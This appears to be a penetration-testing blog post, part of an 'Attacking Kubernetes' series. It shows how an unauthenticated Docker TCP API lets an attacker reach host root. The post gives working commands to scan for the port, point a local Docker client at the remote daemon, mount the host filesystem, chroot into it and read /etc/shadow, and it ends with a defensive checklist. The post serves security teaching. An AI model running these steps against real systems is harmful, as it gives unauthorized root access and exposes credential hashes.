@@ -1,0 +1,90 @@
+---
+title: "Container runtime escape via exposed Docker API"
+description: "When Docker or containerd listens on TCP without auth, mount the host root filesystem and chroot to full host access."
+date: 2025-12-22
+seriesSlug: "kubernetes-offensive"
+seriesTitle: "Attacking Kubernetes"
+seriesPart: 5
+seriesDescription: "Offensive Kubernetes: recon through RBAC abuse, pod escapes, persistence, and cloud pivot."
+tags: ["kubernetes", "docker", "container-escape", "kubernetes-offensive"]
+---
+
+Kubernetes orchestrates containers. Something still has to **run** them: containerd, cri-o, or Docker. When that runtime API is bound to `0.0.0.0` without TLS or auth, you skip Kubernetes entirely and own the node.
+
+## Discovery
+
+```bash
+nmap 192.168.13.129 -T4 -p-
+```
+
+<figure style="text-align:center; margin: 1.25rem 0;" class="blog-figure-wide">
+  <img src="/resources/kubernetes/Pasted-image-20251222234139.png" alt="Nmap finding exposed Docker TCP port" style="display:block; margin:0 auto; max-width:100%; height:auto;" />
+</figure>
+
+Common misconfigurations:
+
+- Docker daemon on **2375** (unencrypted) or **2376** (TLS, sometimes with weak/no client auth)
+- Custom ports (e.g. **1337**) when someone "secured" it by using a non-default port
+
+## Escape path
+
+```
+Attacker ──TCP──► Docker API (0.0.0.0:2375)
+                      │
+                      ▼
+         docker run -v /:/host ubuntu
+                      │
+                      ▼
+              chroot /host  →  host root filesystem
+```
+
+## Exploitation with Docker context
+
+Point your local Docker CLI at the remote daemon:
+
+```bash
+docker context create pwned --docker host=tcp://192.168.13.129:1337
+docker context use pwned
+docker ps
+```
+
+If `docker ps` returns containers, you control the runtime.
+
+## Mount host root and chroot
+
+```bash
+docker run --rm -it -v /:/host ubuntu bash
+```
+
+Inside the container:
+
+```bash
+chroot /host bash
+id
+cat /etc/shadow
+```
+
+You are now operating on the **host** filesystem with whatever privileges the container started with. On many misconfigs that is root.
+
+## containerd / cri-o note
+
+The same pattern applies if you find an exposed containerd socket proxied over TCP. Tools differ (`ctr`, `nerdctl`) but the mount-host-root technique is identical.
+
+## Relationship to Kubernetes attacks
+
+| Vector | Entry | Result |
+|--------|-------|--------|
+| API server (6443) | Stolen token / RBAC bug | Cluster-level access |
+| Kubelet (10250) | Auth bypass / cert issues | Node-level pod control |
+| Docker TCP (2375+) | No auth | **Host root** |
+
+Finding Docker TCP during a K8s assessment means game over for that node regardless of how tight RBAC is.
+
+## Defensive checklist
+
+- Never bind Docker daemon to `0.0.0.0` without mutual TLS.
+- Use `127.0.0.1` for the Docker socket; let kubelet talk via unix socket.
+- Firewall node IPs so worker management ports are control-plane only.
+- Audit with: `ss -tlnp | grep -E '2375|2376|1337'`
+
+Next: building a kubeconfig from a compromised pod's service account token.
